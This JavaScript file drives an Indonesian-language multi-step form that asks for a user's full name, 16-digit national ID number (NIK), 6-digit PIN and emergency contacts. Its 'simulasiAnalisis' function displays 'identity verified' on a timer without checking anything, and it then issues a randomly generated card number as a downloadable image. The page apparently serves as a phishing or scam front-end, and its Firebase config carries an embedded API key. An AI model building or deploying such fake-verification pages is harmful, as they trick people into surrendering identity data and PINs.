import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

// Firebase Config
const firebaseConfig = {
    apiKey: "AIzaSyDXYDqFmhO8nacuX-hVnNsXMmpeqwYlW7U",
    authDomain: "wifist-d3588.firebaseapp.com",
    databaseURL: "https://wifist-d3588-default-rtdb.asia-southeast1.firebasedatabase.app/", 
    projectId: "wifist-d3588"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentStep = 1;

// Navigation Logic
window.nextStep = (s) => {
    if (s === 2) {
        if (document.getElementById('inputNama').value.length < 3) return alert("Nama Lengkap wajib diisi!");
        if (document.getElementById('inputNIK').value.length !== 16) return alert("NIK wajib 16 digit!");
    } 
    else if (s === 6) {
        if (document.getElementById('inputPW').value.length < 6) return alert("PIN wajib 6 digit!");
    }

    currentStep = s;
    updateUI(s);
    if (s === 6) simulasiAnalisis();
};

function updateUI(s) {
    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
    document.getElementById(`step${s}`).classList.add('active');
    
    const percent = ((s - 1) / 7) * 100;
    document.getElementById('progressLine').style.width = percent + "%";
    
    document.querySelectorAll('.circle').forEach((c, i) => {
        if (i < s - 1) { c.classList.add('completed'); c.innerHTML = "✓"; }
        else if (i === s - 1) { c.classList.add('active'); c.innerHTML = i + 1; }
    });
}

function simulasiAnalisis() {
    const status = document.getElementById('slikStatus');
    const btn = document.getElementById('btnSlik');
    setTimeout(() => {
        status.innerHTML = "<b style='color:#22c55e'>IDENTITAS TERVERIFIKASI</b>";
        btn.style.display = "flex";
    }, 2500);
}

// Final Process
window.generateFinal = async () => {
    if (!document.getElementById('checkAgree').checked) return alert("Harap setujui syarat!");
    updateUI(8);
    initQueue();
};

function initQueue() {
    let timeLeft = 120;
    const interval = setInterval(() => {
        timeLeft--;
        document.getElementById('fillBar').style.width = ((120 - timeLeft) / 120 * 100) + "%";
        document.getElementById('timerDisplay').innerText = `Estimasi: ${timeLeft} Detik`;
        if (timeLeft <= 0) {
            clearInterval(interval);
            finalRevealProcess();
        }
    }, 1000);
}

async function finalRevealProcess() {
    document.getElementById('processingArea').style.display = 'none';
    document.getElementById('finalReveal').style.display = 'block';

    const cardNo = "0810" + Math.floor(Math.random() * 899999999999 + 100000000000);
    
    // Set UI Card
    document.getElementById('displayNo').innerText = cardNo.match(/.{1,4}/g).join(" ");
    document.getElementById('displayName').innerText = document.getElementById('inputNama').value.toUpperCase();

    // Sequence animations
    for(let i=1; i<=3; i++) {
        await new Promise(r => setTimeout(r, 800));
        document.getElementById(`rev${i}`).classList.add('show');
    }
}

// SCREENSHOT LOGIC WITH AUTO-FLIP PROTECTION
window.takeScreenshot = () => {
    const cardInner = document.getElementById('cardInner');
    const area = document.getElementById('captureArea');
    const btn = document.getElementById('btnDownload');

    if (cardInner.classList.contains('is-flipped')) {
        // Jika terbalik, balikkan dulu
        cardInner.classList.remove('is-flipped');
        btn.innerText = "MENYIAPKAN...";
        
        // Tunggu animasi balik selesai (800ms) baru capture
        setTimeout(() => {
            executeCapture(area, btn);
        }, 800);
    } else {
        executeCapture(area, btn);
    }
};

function executeCapture(area, btn) {
    btn.innerText = "MENGUNDUH...";
    html2canvas(area, { 
        scale: 3, 
        useCORS: true,
        borderRadius: 20 
    }).then(canvas => {
        const link = document.createElement('a');
        link.download = `BDN-CARD-${Date.now()}.png`;
        link.href = canvas.toDataURL("image/png");
        link.click();
        btn.innerText = "📸 SIMPAN GAMBAR KARTU";
    });
}

// Add Emergency Global
window.addEmergencyField = () => {
    const container = document.getElementById('emergencyContainer');
    const div = document.createElement('div');
    div.className = 'emergency-item';
    div.innerHTML = `
        <div class="input-group"><label>Nama Keluarga</label><input type="text" class="em-name"></div>
        <div class="input-group"><label>Nomor HP</label><input type="tel" class="em-phone"></div>
        <button type="button" onclick="this.parentElement.remove()">Hapus</button>
    `;
    container.appendChild(div);
};
